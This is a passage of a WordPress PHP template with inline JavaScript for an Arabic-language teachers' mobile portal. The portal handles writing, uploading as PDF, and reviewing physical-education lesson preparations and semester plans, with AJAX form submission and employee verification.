                <h2 style="margin: 0 0 4px 0; font-size: 16px; font-weight: 800; color: #0f172a;">أهلاً بك أ. <?php echo esc_html($user->display_name); ?></h2>
                <p style="margin: 0; font-size: 12px; color: #64748b; font-weight: 600; line-height: 1.5;">البوابة الذكية لإعداد وتوثيق تحضير الدروس والخطط الفصلية أسبوعياً</p>
            </div>

            <div id="m-teacher-dashboard-overview" style="margin-bottom: 16px;">
                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 16px;">
                    <!-- ACTION 1: CREATE LESSON PREP -->
                    <button type="button" onclick="eessOpenMobileScreen('create_prep')" style="background: #ffffff; border: 1.5px solid #cbd5e1; border-radius: 16px; padding: 18px 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 2px 6px rgba(0,0,0,0.03);">
                        <div style="width: 46px; height: 46px; background: #fef2f2; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #881337; margin-bottom: 10px;">
                            <span class="dashicons dashicons-welcome-write-blog" style="font-size: 22px; width: 22px; height: 22px;"></span>
                        </div>
                        <span style="font-weight: 800; font-size: 13px; color: #0f172a; margin-bottom: 4px;">إعداد تحضير درس</span>
                        <span style="font-size: 10.5px; color: #64748b;">إدخال عناصر الدرس تفصيلياً</span>
                    </button>

                    <!-- ACTION 2: UPLOAD LESSON PREP -->
                    <button type="button" onclick="eessOpenMobileScreen('upload_prep')" style="background: #ffffff; border: 1.5px solid #cbd5e1; border-radius: 16px; padding: 18px 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 2px 6px rgba(0,0,0,0.03);">
                        <div style="width: 46px; height: 46px; background: #0f172a; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #ffffff; margin-bottom: 10px;">
                            <span class="dashicons dashicons-upload" style="font-size: 22px; width: 22px; height: 22px;"></span>
                        </div>
                        <span style="font-weight: 800; font-size: 13px; color: #0f172a; margin-bottom: 4px;">رفع تحضير درس</span>
                        <span style="font-size: 10.5px; color: #64748b;">رفع وثيقة جاهزة (PDF/Word)</span>
                    </button>

                    <!-- ACTION 3: SUBMIT SEMESTER PLAN -->
                    <button type="button" onclick="eessOpenMobileScreen('submit_plan')" style="background: #ffffff; border: 1.5px solid #cbd5e1; border-radius: 16px; padding: 18px 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 2px 6px rgba(0,0,0,0.03);">
                        <div style="width: 46px; height: 46px; background: #e0f2fe; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #0284c7; margin-bottom: 10px;">
                            <span class="dashicons dashicons-calendar-alt" style="font-size: 22px; width: 22px; height: 22px;"></span>
                        </div>
                        <span style="font-weight: 800; font-size: 13px; color: #0f172a; margin-bottom: 4px;">تقديم خطة فصلية</span>
                        <span style="font-size: 10.5px; color: #64748b;">رفع خطة الفصل الدراسي</span>
                    </button>

                    <!-- ACTION 4: VIEW SEMESTER PLAN -->
                    <button type="button" onclick="eessOpenMobileScreen('view_plans')" style="background: #ffffff; border: 1.5px solid #cbd5e1; border-radius: 16px; padding: 18px 12px; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; cursor: pointer; transition: all 0.2s ease; box-shadow: 0 2px 6px rgba(0,0,0,0.03);">
                        <div style="width: 46px; height: 46px; background: #dcfce7; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: #15803d; margin-bottom: 10px;">
                            <span class="dashicons dashicons-visibility" style="font-size: 22px; width: 22px; height: 22px;"></span>
                        </div>
                        <span style="font-weight: 800; font-size: 13px; color: #0f172a; margin-bottom: 4px;">عرض الخطة الفصلية</span>
                        <span style="font-size: 10.5px; color: #64748b;">استعراض الخطط المسجلة</span>
                    </button>
                </div>

                <!-- DEDICATED SCREEN 2: UPLOAD LESSON PREPARATION -->
                <div id="m-screen-upload-prep" style="display: none; background: #ffffff; border-radius: 16px; padding: 18px; border: 1px solid #cbd5e1; margin-bottom: 16px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; border-bottom: 1px solid #f1f5f9; padding-bottom: 10px;">
                        <h4 style="margin: 0; font-size: 14.5px; font-weight: 800; color: #0f172a;">رفع تحضير درس جاهز</h4>
                        <button type="button" onclick="eessBackToMobileMenu()" style="background: #f1f5f9; border: 1px solid #cbd5e1; color: #475569; padding: 4px 12px; border-radius: 9999px; font-size: 11.5px; font-weight: 800; cursor: pointer;">➔ عودة</button>
                    </div>
                    <form id="eess_mobile_prep_upload_form" onsubmit="eessSubmitMobileUpload(event, 'prep')" method="post" enctype="multipart/form-data">
                        <input type="hidden" name="action" value="sm_submit_mobile_lesson">
                        <?php wp_nonce_field('sm_mobile_prep_nonce', 'sm_nonce'); ?>
                        <div style="margin-bottom: 10px;">
                            <label style="font-size: 11.5px; font-weight: 700; color: #334155; display: block; margin-bottom: 4px;">عنوان الدرس <span style="color:#ef4444;">*</span></label>
                            <input type="text" name="lesson_title" required class="sm-input" placeholder="عنوان وثيقة التحضير..." style="width: 100%; height: 40px; border-radius: 8px; border: 1px solid #cbd5e1; padding: 0 10px; font-size: 12px;">
                        </div>
                        <div style="margin-bottom: 12px;">
                            <label style="font-size: 11.5px; font-weight: 700; color: #334155; display: block; margin-bottom: 4px;">ملف تحضير الدرس (صيغة PDF فقط) <span style="color:#ef4444;">*</span></label>
                            <input type="file" id="m_prep_file_input" name="lesson_file" accept=".pdf" required onchange="eessMobileHandleFileSelect(this, 'prep')" style="width: 100%; font-size: 12px;">
                            <div style="font-size: 10.5px; color: #64748b; margin-top: 3px;">تنبيه: يرجى رفع ملف تحضير الدرس بصيغة PDF المعتمدة فقط.</div>
                        </div>
                        <div id="m_prep_file_status" style="display: none; margin-top: 10px; margin-bottom: 12px; padding: 12px; border-radius: 10px; font-size: 12px;"></div>
                        <button type="submit" id="m_prep_submit_btn" disabled class="sm-btn" style="width: 100%; height: 42px; background: #0f172a; color: white !important; border-radius: 10px; font-weight: 800; font-size: 13px; border: none; cursor: not-allowed; opacity: 0.5;">رفع وإرسال التحضير</button>
                    </form>
                </div>

                <!-- DEDICATED SCREEN 3: SUBMIT SEMESTER PLAN -->
                <div id="m-screen-submit-plan" style="display: none; background: #ffffff; border-radius: 16px; padding: 18px; border: 1px solid #cbd5e1; margin-bottom: 16px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; border-bottom: 1px solid #f1f5f9; padding-bottom: 10px;">
                        <h4 style="margin: 0; font-size: 14.5px; font-weight: 800; color: #0284c7;">تقديم خطة فصلية جديدة</h4>
                        <button type="button" onclick="eessBackToMobileMenu()" style="background: #f1f5f9; border: 1px solid #cbd5e1; color: #475569; padding: 4px 12px; border-radius: 9999px; font-size: 11.5px; font-weight: 800; cursor: pointer;">➔ عودة</button>
                    </div>
                    <form id="eess_mobile_plan_upload_form" onsubmit="eessSubmitMobileUpload(event, 'plan')" method="post" enctype="multipart/form-data">
                        <input type="hidden" name="action" value="sm_save_term_plan">
                        <input type="hidden" name="planning_method" value="upload">
                        <input type="hidden" name="status" value="submitted">
                        <?php wp_nonce_field('sm_term_plan_action', 'sm_nonce'); ?>
                        <div style="margin-bottom: 10px;">
                            <label style="font-size: 11.5px; font-weight: 700; color: #334155; display: block; margin-bottom: 4px;">عنوان الخطة / المادة <span style="color:#ef4444;">*</span></label>
                            <input type="text" name="subject" required class="sm-input" placeholder="اسم المادة والخطة..." style="width: 100%; height: 40px; border-radius: 8px; border: 1px solid #cbd5e1; padding: 0 10px; font-size: 12px;">
                        </div>
                        <div style="margin-bottom: 12px;">
                            <label style="font-size: 11.5px; font-weight: 700; color: #334155; display: block; margin-bottom: 4px;">ملف الخطة الفصلية (صيغة PDF فقط) <span style="color:#ef4444;">*</span></label>
                            <input type="file" id="m_plan_file_input" name="plan_document_file" accept=".pdf" required onchange="eessMobileHandleFileSelect(this, 'plan')" style="width: 100%; font-size: 12px;">
                            <div style="font-size: 10.5px; color: #64748b; margin-top: 3px;">تنبيه: يرجى رفع ملف الخطة الفصلية بصيغة PDF المعتمدة فقط.</div>
                        </div>
                        <div id="m_plan_file_status" style="display: none; margin-top: 10px; margin-bottom: 12px; padding: 12px; border-radius: 10px; font-size: 12px;"></div>
                        <button type="submit" id="m_plan_submit_btn" disabled class="sm-btn" style="width: 100%; height: 42px; background: #0284c7; color: white !important; border-radius: 10px; font-weight: 800; font-size: 13px; border: none; cursor: not-allowed; opacity: 0.5;">رفع وإرسال الخطة الفصلية</button>
                    </form>
                </div>

                <!-- DEDICATED SCREEN 4: VIEW SEMESTER PLAN HISTORY -->
                <div id="m-screen-view-plans" style="display: none; background: #ffffff; border-radius: 16px; padding: 18px; border: 1px solid #cbd5e1; margin-bottom: 16px;">
                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px; border-bottom: 1px solid #f1f5f9; padding-bottom: 10px;">
                        <h4 style="margin: 0; font-size: 14.5px; font-weight: 800; color: #15803d;">عرض واستعراض الخطط الفصلية</h4>
                        <button type="button" onclick="eessBackToMobileMenu()" style="background: #f1f5f9; border: 1px solid #cbd5e1; color: #475569; padding: 4px 12px; border-radius: 9999px; font-size: 11.5px; font-weight: 800; cursor: pointer;">➔ عودة</button>
                    </div>
                    <?php if (empty($teacher_own_preps)): ?>
                        <div style="padding: 20px; text-align: center; color: #94a3b8; font-size: 12px; font-weight: 700;">لا توجد خطط فصلية مسجلة حالياً.</div>
                    <?php else: ?>
                        <div style="display: flex; flex-direction: column; gap: 10px;">
                            <?php foreach ($teacher_own_preps as $top): ?>
                                <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 10px; padding: 12px; font-size: 12px;">
                                    <div style="font-weight: 800; color: #0f172a; margin-bottom: 4px;"><?php echo esc_html($top->title); ?></div>
                                    <div style="color: #64748b; font-size: 11px;">المادة: <?php echo esc_html($top->subject); ?> | التاريخ: <?php echo esc_html($top->lesson_date); ?></div>
                                </div>
                            <?php endforeach; ?>
                        </div>
                    <?php endif; ?>
                </div>
            </div>

            <script>
            function eessOpenMobileScreen(screenKey) {
                document.getElementById('m-teacher-dashboard-overview').style.display = 'block';
                document.getElementById('m-screen-upload-prep').style.display = (screenKey === 'upload_prep') ? 'block' : 'none';
                document.getElementById('m-screen-submit-plan').style.display = (screenKey === 'submit_plan') ? 'block' : 'none';
                document.getElementById('m-screen-view-plans').style.display = (screenKey === 'view_plans') ? 'block' : 'none';

                if (screenKey === 'create_prep') {
                    document.getElementById('m-step-form').style.display = 'block';
                    document.getElementById('m-step-form').scrollIntoView({ behavior: 'smooth' });
                } else {
                    document.getElementById('m-step-form').style.display = 'none';
                    var target = document.getElementById('m-screen-' + screenKey.replace('_', '-'));
                    if (target) target.scrollIntoView({ behavior: 'smooth' });
                }
            }

            function eessBackToMobileMenu() {
                document.getElementById('m-screen-upload-prep').style.display = 'none';
                document.getElementById('m-screen-submit-plan').style.display = 'none';
                document.getElementById('m-screen-view-plans').style.display = 'none';
                document.getElementById('m-step-form').style.display = 'none';
                document.getElementById('m-teacher-dashboard-overview').scrollIntoView({ behavior: 'smooth' });
            }

            function eessMobileHandleFileSelect(input, mode) {
                var statusBox = document.getElementById(mode === 'prep' ? 'm_prep_file_status' : 'm_plan_file_status');
                var submitBtn = document.getElementById(mode === 'prep' ? 'm_prep_submit_btn' : 'm_plan_submit_btn');

                if (!input.files || !input.files[0]) {
                    statusBox.style.display = 'none';
                    statusBox.innerHTML = '';
                    submitBtn.disabled = true;
                    submitBtn.style.opacity = '0.5';
                    submitBtn.style.cursor = 'not-allowed';
                    return;
                }

                var file = input.files[0];
                var ext = file.name.split('.').pop().toLowerCase();

                if (ext !== 'pdf') {
                    statusBox.style.display = 'block';
                    statusBox.style.background = '#fef2f2';
                    statusBox.style.border = '1px solid #fca5a5';
                    statusBox.style.color = '#991b1b';
                    statusBox.innerHTML = '<div style="font-weight: 800; margin-bottom: 2px;">✕ نوع الملف غير مسموح</div>' +
                                          '<div style="font-size: 11px;">يجب رفع الملف بصيغة PDF فقط (.pdf). لن يتم قبول صيغ أخرى.</div>';
                    submitBtn.disabled = true;
                    submitBtn.style.opacity = '0.5';
                    submitBtn.style.cursor = 'not-allowed';
                    return;
                }

                var fileSizeMB = (file.size / (1024 * 1024)).toFixed(2);
                statusBox.style.display = 'block';
                statusBox.style.background = '#f0fdf4';
                statusBox.style.border = '1px solid #86efac';
                statusBox.style.color = '#166534';
                statusBox.innerHTML = '<div style="display: flex; align-items: center; gap: 8px; font-weight: 800; font-size: 12.5px; margin-bottom: 4px;">' +
                                      '<span style="display: inline-flex; align-items: center; justify-content: center; width: 20px; height: 20px; background: #22c55e; color: white; border-radius: 50%; font-size: 12px; font-weight: 900;">✓</span>' +
                                      '<span>تم فحص وتأكيد جاهزية الملف</span>' +
                                      '</div>' +
                                      '<div style="font-size: 11px; color: #15803d; line-height: 1.4;">' +
                                      '<strong>اسم الملف:</strong> ' + file.name + '<br>' +
                                      '<strong>الحجم:</strong> ' + fileSizeMB + ' ميجابايت' +
                                      '</div>';

                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
                submitBtn.style.cursor = 'pointer';
            }

            function eessSubmitMobileUpload(e, mode) {
                e.preventDefault();
                var form = e.target;
                var submitBtn = document.getElementById(mode === 'prep' ? 'm_prep_submit_btn' : 'm_plan_submit_btn');
                var fileInput = document.getElementById(mode === 'prep' ? 'm_prep_file_input' : 'm_plan_file_input');

                if (!fileInput.files || !fileInput.files[0]) {
                    eessShowMobileToast('يرجى اختيار ملف التحضير أولاً قبل الإرسال.', 'error');
                    return;
                }

                submitBtn.disabled = true;
                submitBtn.style.opacity = '0.6';
                submitBtn.innerHTML = 'جاري التحميل والحفظ... ⏳';

                var formData = new FormData(form);

                jQuery.ajax({
                    url: '<?php echo esc_url(admin_url("admin-ajax.php")); ?>',
                    type: 'POST',
                    data: formData,
                    processData: false,
                    contentType: false,
                    success: function(res) {
                        submitBtn.disabled = false;
                        submitBtn.style.opacity = '1';
                        submitBtn.innerHTML = (mode === 'prep') ? 'رفع وإرسال التحضير' : 'رفع وإرسال الخطة الفصلية';

                        if (res.success) {
                            eessShowMobileToast('✓ ' + (res.data && res.data.message ? res.data.message : 'تم رفع وإرسال الملف بنجاح!'), 'success');
                            form.reset();
                            eessMobileHandleFileSelect(fileInput, mode);

                            setTimeout(function() {
                                window.location.reload();
                            }, 1200);
                        } else {
                            eessShowMobileToast('✕ ' + (res.data || 'حدث خطأ أثناء رفع الملف، يرجى المحاولة لاحقاً.'), 'error');
                        }
                    },
                    error: function() {
                        submitBtn.disabled = false;
                        submitBtn.style.opacity = '1';
                        submitBtn.innerHTML = (mode === 'prep') ? 'رفع وإرسال التحضير' : 'رفع وإرسال الخطة الفصلية';
                        eessShowMobileToast('✕ فشل الاتصال بالخادم، يرجى التحقق من الاتصال والمحاولة مجدداً.', 'error');
                    }
                });
            }
            </script>
            <?php endif; ?>

            <!-- TEACHER PAST PREPARATIONS ARCHIVE CARD -->
            <div id="m-teacher-history-card" style="display: <?php echo (!empty($teacher_own_preps)) ? 'block' : 'none'; ?>; background: #ffffff; border-radius: 16px; padding: 18px; border: 1px solid #e2e8f0; margin-top: 15px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.03);">
                <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #f1f5f9; padding-bottom: 10px; margin-bottom: 12px;">
                    <h3 style="margin: 0; font-size: 14.5px; font-weight: 800; color: #0f172a; display: flex; align-items: center; gap: 8px;">
                        <span class="dashicons dashicons-portfolio" style="color: #881337;"></span>
                        <span>أرشيف وسجل تحضيراتي السابقة</span>
                    </h3>
                    <span style="font-size: 11px; color: #64748b; font-weight: 700;"><?php echo count($teacher_own_preps); ?> تحضير</span>
                </div>

                <div style="display: flex; flex-direction: column; gap: 10px; max-height: 280px; overflow-y: auto;">
                    <?php foreach ($teacher_own_preps as $top):
                        $s_bg = '#f1f5f9'; $s_col = '#64748b'; $s_lbl = 'مسودة';
                        if ($top->status === 'submitted') { $s_bg = '#e0f2fe'; $s_col = '#0369a1'; $s_lbl = 'مرفوع للمراجعة'; }
                        elseif ($top->status === 'approved') { $s_bg = '#dcfce7'; $s_col = '#15803d'; $s_lbl = 'معتمد رسمياً'; }
                        elseif ($top->status === 'revision_required' || $top->status === 'returned') { $s_bg = '#fee2e2'; $s_col = '#b91c1c'; $s_lbl = 'طلب تعديل'; }
                    ?>
                        <div onclick="eessMobileReopenOwnPrep(<?php echo htmlspecialchars(json_encode($top)); ?>)" style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 12px; cursor: pointer; transition: all 0.2s ease;">
                            <div style="display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 4px;">
                                <div style="font-weight: 800; font-size: 13px; color: #0f172a;"><?php echo esc_html($top->title); ?></div>
                                <span style="font-size: 10px; padding: 2px 8px; border-radius: 9999px; background: <?php echo $s_bg; ?>; color: <?php echo $s_col; ?>; font-weight: 800; white-space: nowrap;"><?php echo $s_lbl; ?></span>
                            </div>
                            <div style="font-size: 11px; color: #64748b; display: flex; justify-content: space-between; align-items: center; margin-top: 4px;">
                                <span><span class="dashicons dashicons-book" style="font-size: 13px; width: 13px; height: 13px; color: #881337; vertical-align: middle;"></span> <?php echo esc_html($top->subject); ?> (<?php echo esc_html($top->grade_level); ?>)</span>
                                <div style="display: flex; gap: 6px; align-items: center;">
                                    <a href="<?php echo esc_url(add_query_arg(array('sm_action' => 'print', 'print_type' => 'lesson_prep', 'prep_id' => $top->id), home_url('/'))); ?>" target="_blank" onclick="event.stopPropagation();" style="color: #0284c7; text-decoration: none; font-weight: 800; font-size: 11px; background: #e0f2fe; padding: 2px 8px; border-radius: 9999px;">📄 PDF / مشاركة</a>
                                    <span style="font-family: monospace; font-size: 10.5px;"><?php echo esc_html($top->lesson_date); ?></span>
                                </div>
                            </div>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>

            <!-- STEP 3: Mobile Lesson Preparation Form -->
            <div id="m-step-form" style="display: none; margin-top: 15px;">
                <form id="eess_mobile_prep_form" onsubmit="eessSubmitMobileLesson(event)">
                    <input type="hidden" id="m_form_teacher_id" name="teacher_id">
                    <input type="hidden" id="m_form_emp_id" name="emp_id">
                    <input type="hidden" name="sm_nonce" value="<?php echo esc_attr($nonce); ?>">

                    <!-- Basic Info Box -->
                    <div style="background: #ffffff; border-radius: 16px; padding: 20px; border: 1px solid #e2e8f0; margin-bottom: 15px;">
                        <h4 style="margin: 0 0 15px 0; font-size: 14px; font-weight: 800; color: #0f172a; border-bottom: 2px solid #f1f5f9; padding-bottom: 8px;">1. بيانات الدرس الأساسية</h4>

                        <div style="margin-bottom: 12px;">
                            <label style="display: block; font-size: 12px; font-weight: 700; color: #334155; margin-bottom: 4px;">عنوان الدرس <span style="color:#ef4444;">*</span></label>
                            <input type="text" id="m_title" name="title" required placeholder="عنوان الدرس الرئيسي" style="width: 100%; height: 42px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0 10px; font-size: 13px; box-sizing: border-box;">
                        </div>

                        <div style="margin-bottom: 12px;">
                            <label style="display: block; font-size: 12px; font-weight: 700; color: #334155; margin-bottom: 4px;">المادة الدراسية <span style="color:#ef4444;">*</span></label>
                            <select id="m_subject" name="subject" required style="width: 100%; height: 42px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0 10px; font-size: 13px; box-sizing: border-box;">
                                <?php foreach($unique_subjects as $s_name): ?>
                                    <option value="<?php echo esc_attr($s_name); ?>"><?php echo esc_html($s_name); ?></option>
                                <?php endforeach; ?>
                            </select>
                        </div>

                        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 12px;">
                            <div>
                                <label style="display: block; font-size: 12px; font-weight: 700; color: #334155; margin-bottom: 4px;">الصف <span style="color:#ef4444;">*</span></label>
                                <input type="text" id="m_grade" name="grade_level" required placeholder="الصف الخامس" style="width: 100%; height: 42px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0 10px; font-size: 13px; box-sizing: border-box;">
                            </div>
                            <div>
                                <label style="display: block; font-size: 12px; font-weight: 700; color: #334155; margin-bottom: 4px;">الشعبة / الفصل</label>
                                <input type="text" id="m_section" name="class_section" placeholder="أ / 1" style="width: 100%; height: 42px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0 10px; font-size: 13px; box-sizing: border-box;">
                            </div>
                        </div>

                        <div>
                            <label style="display: block; font-size: 12px; font-weight: 700; color: #334155; margin-bottom: 4px;">تاريخ الدرس</label>
                            <input type="date" id="m_date" name="lesson_date" value="<?php echo current_time('Y-m-d'); ?>" style="width: 100%; height: 42px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 0 10px; font-size: 13px; box-sizing: border-box;">
                        </div>
                    </div>

                    <!-- Academic Content Box (Fully Synchronized with Desktop) -->
                    <div style="background: #ffffff; border-radius: 16px; padding: 20px; border: 1px solid #e2e8f0; margin-bottom: 15px;">
                        <h4 style="margin: 0 0 15px 0; font-size: 14px; font-weight: 800; color: #0f172a; border-bottom: 2px solid #f1f5f9; padding-bottom: 8px;">2. عناصر ومحتوى التحضير الشامل</h4>

                        <!-- Objectives (150-350 chars) -->
                        <div style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 12px; font-weight: 800; color: #0f172a; margin-bottom: 2px;">هدف الدرس السلوكي والتعلمي <span style="color:#ef4444;">*</span></label>
                            <textarea id="m_objectives" name="objectives" maxlength="350" oninput="eessUpdateMobileCharBounds(this, 150, 350, 'm_cnt_objectives')" placeholder="صياغة هدف الدرس (150 – 350 حرفاً)..." style="width: 100%; height: 90px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 8px 10px; font-size: 12.5px; box-sizing: border-box; line-height: 1.5;"></textarea>
                            <div id="m_cnt_objectives" style="text-align: left; font-size: 10.5px; font-weight: 700; color: #dc2626; font-family: monospace; margin-top: 2px;">0 / 150 - 350 حرف</div>
                        </div>

                        <!-- Warmup (150-350 chars) -->
                        <div style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 12px; font-weight: 800; color: #0f172a; margin-bottom: 2px;">1. الإحماء والتهيئة البدنية (Warm-Up) <span style="color:#ef4444;">*</span></label>
                            <textarea id="m_warmup" name="warmup" maxlength="350" oninput="eessUpdateMobileCharBounds(this, 150, 350, 'm_cnt_warmup')" placeholder="تمارين الإحماء والتهيئة (150 – 350 حرفاً)..." style="width: 100%; height: 85px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 8px 10px; font-size: 12.5px; box-sizing: border-box; line-height: 1.5;"></textarea>
                            <div id="m_cnt_warmup" style="text-align: left; font-size: 10.5px; font-weight: 700; color: #dc2626; font-family: monospace; margin-top: 2px;">0 / 150 - 350 حرف</div>
                        </div>

                        <!-- Physical Prep (150-400 chars) -->
                        <div style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 12px; font-weight: 800; color: #0f172a; margin-bottom: 2px;">2. الإعداد البدني العام والخاص <span style="color:#ef4444;">*</span></label>
                            <textarea id="m_physical_prep" name="physical_prep" maxlength="400" oninput="eessUpdateMobileCharBounds(this, 150, 400, 'm_cnt_physical_prep')" placeholder="تدريبات اللياقة والإعداد البدني (150 – 400 حرفاً)..." style="width: 100%; height: 85px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 8px 10px; font-size: 12.5px; box-sizing: border-box; line-height: 1.5;"></textarea>
                            <div id="m_cnt_physical_prep" style="text-align: left; font-size: 10.5px; font-weight: 700; color: #dc2626; font-family: monospace; margin-top: 2px;">0 / 150 - 400 حرف</div>
                        </div>

                        <!-- Skill Prep (150-400 chars) -->
                        <div style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 12px; font-weight: 800; color: #0f172a; margin-bottom: 2px;">3. الإعداد المهاري والخططي <span style="color:#ef4444;">*</span></label>
                            <textarea id="m_skill_prep" name="skill_prep" maxlength="400" oninput="eessUpdateMobileCharBounds(this, 150, 400, 'm_cnt_skill_prep')" placeholder="شرح الخطوات المهارية والخططية (150 – 400 حرفاً)..." style="width: 100%; height: 85px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 8px 10px; font-size: 12.5px; box-sizing: border-box; line-height: 1.5;"></textarea>
                            <div id="m_cnt_skill_prep" style="text-align: left; font-size: 10.5px; font-weight: 700; color: #dc2626; font-family: monospace; margin-top: 2px;">0 / 150 - 400 حرف</div>
                        </div>

                        <!-- Conclusion (150-350 chars) -->
                        <div style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 12px; font-weight: 800; color: #0f172a; margin-bottom: 2px;">4. الخاتمة والتهدئة والإطالات <span style="color:#ef4444;">*</span></label>
                            <textarea id="m_conclusion" name="conclusion" maxlength="350" oninput="eessUpdateMobileCharBounds(this, 150, 350, 'm_cnt_conclusion')" placeholder="تمارين التهدئة والختام (150 – 350 حرفاً)..." style="width: 100%; height: 85px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 8px 10px; font-size: 12.5px; box-sizing: border-box; line-height: 1.5;"></textarea>
                            <div id="m_cnt_conclusion" style="text-align: left; font-size: 10.5px; font-weight: 700; color: #dc2626; font-family: monospace; margin-top: 2px;">0 / 150 - 350 حرف</div>
                        </div>

                        <!-- National Agenda -->
                        <div style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 12px; font-weight: 800; color: #0f172a; margin-bottom: 2px;">الربط بالأجندة الوطنية ورؤية الدولة <span style="color:#ef4444;">*</span></label>
                            <textarea id="m_national_agenda" name="national_agenda" placeholder="تفاصيل الربط بالأجندة الوطنية..." style="width: 100%; height: 75px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 8px 10px; font-size: 12.5px; box-sizing: border-box; line-height: 1.5;"></textarea>
                        </div>

                        <!-- Cross Subject -->
                        <div style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 12px; font-weight: 800; color: #0f172a; margin-bottom: 2px;">الربط بالمواد والتخصصات الأخرى <span style="color:#ef4444;">*</span></label>
                            <textarea id="m_cross_subject" name="cross_subject" placeholder="تفاصيل الربط بالمواد الأخرى..." style="width: 100%; height: 75px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 8px 10px; font-size: 12.5px; box-sizing: border-box; line-height: 1.5;"></textarea>
                        </div>

                        <!-- Notes & Guidance -->
                        <div style="margin-bottom: 14px;">
                            <label style="display: block; font-size: 12px; font-weight: 800; color: #0f172a; margin-bottom: 2px;">الملاحظات وإرشادات السلامة والتوجيهات</label>
                            <textarea id="m_notes" name="notes" placeholder="أدخل الملاحظات وإرشادات السلامة إن وجدت..." style="width: 100%; height: 75px; border: 1px solid #cbd5e1; border-radius: 8px; padding: 8px 10px; font-size: 12.5px; box-sizing: border-box; line-height: 1.5;"></textarea>
                        </div>

                        <script>
                        function eessUpdateMobileCharBounds(input, minLen, maxLen, badgeId) {
                            var len = input.value.length;
                            var badge = document.getElementById(badgeId);
                            if (badge) {
                                if (len < minLen) {
                                    badge.style.color = '#dc2626';
                                    badge.innerText = len + ' / ' + minLen + ' - ' + maxLen + ' حرف (المتبقي ' + (minLen - len) + ' حرف على الأقل)';
                                } else if (len > maxLen) {
                                    badge.style.color = '#dc2626';
                                    badge.innerText = len + ' / ' + minLen + ' - ' + maxLen + ' حرف (تجاوزت الحد الأقصى بـ ' + (len - maxLen) + ' حرف)';
                                } else {
                                    badge.style.color = '#16a34a';
                                    badge.innerText = len + ' / ' + minLen + ' - ' + maxLen + ' حرف ✓ (مكتمل ومستوفي)';
                                }
                            }
                        }
                        </script>
                    </div>

                    <div id="m_submit_status" style="display: none; margin-bottom: 15px; padding: 12px; border-radius: 8px; font-size: 13px; font-weight: 700; text-align: center;"></div>

                    <button type="submit" id="m_btn_submit" style="width: 100%; height: 48px; background: #2563eb; color: white; border: none; border-radius: 12px; font-weight: 800; font-size: 15px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px;">
                        <span>إرسال وتوثيق التحضير</span>
                    </button>
                </form>
            </div>
        </div>

        <script>
            let currentTeacherData = null;

            function eessVerifyMobileEmp() {
                const empId = document.getElementById('m_emp_id_input').value.trim();
                const passVal = document.getElementById('m_password_input') ? document.getElementById('m_password_input').value : '';
                const msgBox = document.getElementById('m_verify_msg');
                const btn = document.getElementById('m_btn_verify');

                if (!empId) {
                    msgBox.style.display = 'block';
                    msgBox.style.background = '#fef2f2';
                    msgBox.style.color = '#991b1b';
                    msgBox.innerText = 'يرجى إدخال الرقم الوظيفي أو رقم الجوال أولاً.';
                    return;
                }

                btn.disabled = true;
                btn.innerText = 'جاري التحقق والتأكد...';
                msgBox.style.display = 'none';

                jQuery.post('<?php echo $ajax_url; ?>', {
                    action: 'sm_verify_employee_id',
                    emp_id: empId,
                    password: passVal
                }, function(res) {
                    btn.disabled = false;
                    btn.innerText = 'تسجيل الدخول والتحقق';

                    if (res.success) {
                        location.reload();
                    } else {
                        msgBox.style.display = 'block';
                        msgBox.style.background = '#fef2f2';
                        msgBox.style.color = '#991b1b';
                        msgBox.innerText = res.data || 'لم يتم العثور على حساب مطابق للبيانات المدخلة. يرجى التأكد من الرقم الوظيفي أو رقم الهاتف.';
                    }
                });
            }

            function eessConfirmMobileIdentity() {
                if (!currentTeacherData) return;
                document.getElementById('m_form_teacher_id').value = currentTeacherData.teacher_id;
                document.getElementById('m_form_emp_id').value = currentTeacherData.emp_id;

                if (currentTeacherData.subject && currentTeacherData.subject !== 'عام') {
                    const sel = document.getElementById('m_subject');
                    for (let i = 0; i < sel.options.length; i++) {
                        if (sel.options[i].value === currentTeacherData.subject) {
                            sel.selectedIndex = i;
                            break;
                        }
                    }
                }

